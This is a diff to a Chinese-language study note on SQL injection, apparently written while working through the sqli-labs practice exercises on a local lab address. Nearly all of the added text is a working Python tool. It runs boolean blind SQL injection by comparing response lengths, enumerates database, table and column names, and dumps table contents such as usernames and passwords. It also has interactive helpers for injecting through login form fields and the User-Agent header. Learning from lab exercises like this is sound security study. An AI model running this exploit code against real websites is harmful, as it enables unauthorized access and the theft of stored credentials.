@@ -225,3 +225,195 @@ SQL注入基础部分就先到这里吧。简单总结一下手法：
 不全，因为只列了刚真正学到的，其他太简单或者太复杂的就，再说吧。
 
 > 先判断能不能闭合(`id=1'`)或者增加条件判断(`id=1' and 1=1`)，看看有无报错；如果没报错先看看能不能在返回页面把数据爆出来，再看看能不能根据页面返回的情况判断payload是否执行，后者即进入了盲注的区域。不论是延时注入还是基于布尔型的判断，只要能判断payload是否执行就存在注入。而如果页面如果极其明显的正确payload和错误payload都返回同样的页面则可以尝试延时注入。
+
+## 放一些无WAF过滤情况下常用的代码
+
+```python
+import requests,re,time
+
+
+def get_query_len(func,url,args_name=None):
+    html_len = requests.get(url).headers.get('Content-Length')
+    if func == 'database':
+        payload = "' and (length((select database())))={} -- "
+    elif func == 'table':
+        payload = "' and (length((select group_concat(table_name) from information_schema.tables where table_schema='"+str(args_name)+"')))={} -- "
+    elif func == 'column':
+        payload = "' and (length((select group_concat(column_name) from information_schema.columns where table_name='"+str(args_name)+"')))={} -- "
+    elif func == 'data':
+        if len(args_name) != 1:
+            return False
+        key = list(args_name.keys())[0]
+        val = args_name[key]
+        payload = "' and (length((select group_concat("+val+") from "+key+")))={} -- "
+    else:
+        return False
+    url = url + payload
+    for i in range(200):
+        req_len = requests.get(url.format(str(i))).headers.get('Content-Length')
+        if req_len == html_len:
+            return i
+    return None
+
+
+def blind_injection_structure(func='database', url=None, args_name=None):
+    '''
+
+    :param func:
+        database    table   column  爆破功能
+    :param url:
+        eg:        url = "http://192.168.145.129:8888/Less-5/?id=1"
+    :param args_name:
+        具体的参数名，eg：
+            blind_injection_structure(func='database', url=None,): 爆破当前数据库
+            blind_injection_structure(func='database', url=None, args_name=user): 爆破数据库名为user的表名
+            blind_injection_structure(func='database', url=None, args_name=user): 爆破表名为user的列名（默认在当前数据库下）
+    :return:
+    '''
+    if not url:
+        url = "http://192.168.145.129:8888/Less-5/?id=1"
+    if func == 'database':
+        payload = "' and  (select ascii(substring((select database()),{start},{index}))={asc}) -- "
+    elif func == 'table':
+        payload = "' and  (select ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema='{args_name}'),{start},{index}))={asc}) -- "
+    elif func == 'column':
+        payload = "' and  (select ascii(substring((select group_concat(column_name) from information_schema.columns where table_name='{args_name}'),{start},{index}))={asc}) -- "
+    else:
+        return
+    dump_str = ''
+    query_len = get_query_len(func, url,args_name=args_name)
+    html_len = requests.get(url).headers.get('Content-Length')
+    print(html_len)
+    asc_list = [44]+[x for x in range(65,91)] + [x for x in range(97,123)]
+    for i in range(1,query_len+1):
+        for j in asc_list:
+            req_len = requests.get(url + payload.format(args_name=args_name, start=i, index='1', asc=str(j))).headers.get('Content-Length')
+            print(f'{req_len}   start {i}, index: {j},  {dump_str}')
+            if req_len == html_len:
+                dump_str += chr(j)
+
+                break
+    print(html_len)
+    if func == 'database':
+        print(f'result:db:  {dump_str}')
+    else:
+        print(f'result:     {func}:{args_name}:  {dump_str}')
+    return dump_str
+
+
+def sqli_blind_dump_all_schema(url):
+    '''
+        爆破当前数据库所有结构信息
+    :param url:
+    :return:
+        eg:
+            {
+            'users':'id,username,password'
+            }
+    '''
+    db_name = blind_injection_structure(func='database', url=url)
+    print(f'db:{db_name}')
+    tables = blind_injection_structure(func='table', url=url, args_name=db_name)
+    print(f'table: {tables}')
+    tables = tables.split(',')
+    tables = ['users','emails']
+    columns = dict()
+    for i in tables:
+        column = blind_injection_structure(func='column', url=url, args_name=i)
+        columns[i] = column
+    print(columns)
+    return columns
+
+
+def sqli_blind_dump_data(url,schema={'users':'id,username,password'}):
+    '''
+
+    :param url:
+    :param schema:
+    :return:
+    '''
+    payload = "' and (select ascii(substring((select group_concat({column}) from {table}),{start},1))) = {asc} -- "
+    dump_str = ''
+    query_len = get_query_len('data', url, args_name=schema)
+    print(f'query_len:{query_len}')
+    html_len = requests.get(url).headers.get('Content-Length')
+    print(html_len)
+    asc_list = [44] + [x for x in range(48, 58)] + [x for x in range(65, 91)] + [x for x in range(97, 123)]
+    if len(schema) != 1:
+        return False
+    table_name = list(schema.keys())[0]
+    column_name = schema[table_name]
+    for i in range(1, query_len + 1):
+        for j in asc_list:
+            s = url + payload.format(column=column_name, table=table_name, start=i, asc=str(j))
+            req_len = requests.get(s).headers.get('Content-Length')
+            time.sleep(0.1)
+            if req_len == html_len:
+                dump_str += chr(j)
+                print(f'start {i}, index: {j},  {dump_str}')
+                break
+    result = dump_str.split(',')
+    return result
+
+
+def sqli_blind_dump_all_data(url):
+    schema = sqli_blind_dump_all_schema(url)
+    result = list()
+    for i in list(schema.items()):
+        temp = dict()
+        temp[i[0]] = i[1]
+        temp['data'] = sqli_blind_dump_data(url,{i[0]:i[1]})
+        result.append(temp)
+    for i in result:
+        print(list(i.items()))
+        print(i['data'])
+    return result
+
+
+def post_login(url):
+    while 1:
+        uname = input()
+        passwd = input()
+        # uname = 'admin'
+        # passwd = 'admin'
+        data = {'uname':uname,'passwd':passwd}
+        req = requests.post(url,data=data)
+        print(req.headers)
+        r = req.text.split('''\r\n\r\n\r\n\r\n''')[2]
+        # r = re.findall(r'<br>.*/></font>',r)
+        print(r)
+
+def header_injection(url):
+    hdr_dic = {
+        'Accept': 'text / html, application / xhtml + xml, application / xml',
+        'Accept-Encoding': 'gzip, deflate',
+        'Referer': 'http: // 192.168.145.129: 8888 / Less - 18 /',
+        'Content-Type': 'application / x - www - form - urlencoded',
+        'Connection': 'close',
+        'Upgrade-Insecure - Requests': '1',
+        'User-Agent': 'Mozilla / 5.0(Windows'
+
+    }
+    while 1:
+        # uname = 'admin'
+        # passwd = 'admin'
+        data = {'uname':'admin','passwd':'admin'}
+        hdr_dic['User-Agent'] = input()
+        print(hdr_dic)
+        req = requests.post(url,data=data,headers=hdr_dic)
+        r = req.text.split('''\r\n\r\n\r\n\r\n''')[2]
+        # r = re.findall(r'<br>.*/></font>',r)
+        print(r)
+
+url = "http://192.168.145.129:8888/Less-5/?id=1"
+
+# blind_injection_structure(func='database', url=url)
+# blind_injection_structure(func='table', url=url,args_name='security')
+# blind_injection_structure(func='column', url=url,args_name='users')
+# sqli_blind_dump_all_schema(url)
+
+data = sqli_blind_dump_all_data(url)
+# print(data)	
+```
+
+备忘。
